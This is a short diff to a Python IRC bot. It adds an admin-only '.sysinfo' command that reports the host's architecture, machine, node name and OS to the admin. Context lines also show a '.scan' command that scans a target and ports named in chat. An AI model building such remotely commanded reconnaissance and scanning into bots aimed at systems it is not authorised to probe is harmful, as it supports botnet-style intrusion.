@@ -369,13 +369,18 @@ def main():
                 # Respond to '.uname' command from admin.
                 if name.lower() == adminname.lower() and message.find('.uname') != -1:
                     sendmsg("System Info: " + format(uname()), adminname)
+                    
+                # Respond to '.sysinfo' command from admin.
+                if name.lower() == adminname.lower() and message.find('.sysinfo') != -1:
                     # Architecture
                     sendmsg("Architecture: " + format(platform.architecture()[0]), adminname)
                     # machine
                     sendmsg("Machine: " + format(platform.machine()), adminname)
                     # node
                     sendmsg("Node: " + format(platform.node()), adminname)
-
+                    # system
+                    sendmsg("System: " + format(platform.system()), adminname)
+                                
                 # Respond to '.scan [target] [port(s)]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.scan') != -1:
                     target = message.split(' ', 1)[1]
